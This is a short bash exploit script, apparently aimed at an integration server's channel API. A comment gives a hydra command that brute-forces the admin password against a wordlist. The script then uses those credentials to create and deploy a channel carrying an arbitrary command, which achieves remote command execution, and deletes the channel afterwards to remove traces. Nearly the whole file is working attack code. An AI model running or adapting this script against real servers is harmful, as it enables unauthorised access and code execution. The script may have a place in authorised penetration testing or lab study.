#!/bin/bash

# Bruteforce creds with
# hydra -I -l admin -P /usr/share/wfuzz/wordlist/others/common_pass.txt "https-get://localhost:8443/api/users:H=X-Requested-With\: OpenAPI:A=BASIC:F=401"

USERNAME=$1
PASSWORD=$2
AUTH=`echo -n "${USERNAME}:${PASSWORD}" | base64`
CMD=$3
ID=`uuidgen`
PAYLOAD=`cat channel.json | sed "s,!!ID!!,$ID,g" | sed "s,!!CMD!!,$CMD,g"`

echo "[.] Creating channel $ID ..." && \
curl -k -X POST "https://localhost:8443/api/channels" -H "Authorization: Basic $AUTH" -H  "accept: application/json" -H  "Content-Type: application/json" -H  "X-Requested-With: OpenAPI" -d "$PAYLOAD" && \
echo "[.] Deploying channel ..." && \
curl -k -X POST "https://localhost:8443/api/channels/_deploy" -H "Authorization: Basic $AUTH" -H  "accept: application/xml" -H  "Content-Type: application/json" -H  "X-Requested-With: OpenAPI" -d "{\"set\": {\"string\": [\"$ID\"]}}" && \
echo "[!] Channel deployed!" && \
echo "[.] Deleting channel ..." && \
curl -k -X DELETE "https://localhost:8443/api/channels/${ID}" -H "Authorization: Basic $AUTH" -H  "accept: application/json" -H  "Content-Type: application/json" -H  "X-Requested-With: OpenAPI" && \
echo "[.] Channel deleted." && \
echo "[+] All done."